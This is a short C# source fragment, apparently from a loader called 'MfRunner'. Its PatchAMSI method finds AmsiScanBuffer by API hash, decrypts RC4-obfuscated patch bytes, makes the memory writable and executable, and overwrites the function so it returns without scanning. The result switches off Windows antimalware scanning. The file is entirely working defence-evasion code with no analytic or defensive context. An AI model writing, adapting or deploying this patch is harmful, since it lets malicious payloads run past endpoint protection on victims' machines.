using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
        public static void PatchAMSI()
        {
            IntPtr AmsiScanBufferAddress = GetExportAddress(AmsiAddress, 0xDE7FB4D9);
            if (AmsiScanBufferAddress == IntPtr.Zero)
                return;

            byte[] AmsiPatchBytes = new byte[] { 144, 144, 144, 144, 144, 144, 144, 144, 49, 192, 195 };
            ApplyRC4(AmsiPatchBytes, DeriveKey(SEED_AMSI_PATCH));
            uint OldProtect = 0;
            if (CustomVirtualProtect(AmsiScanBufferAddress, (UIntPtr)AmsiPatchBytes.Length, 0x40, out OldProtect))
            {
                CopyFunction(AmsiScanBufferAddress, AmsiPatchBytes);
            }
        }
    }
}
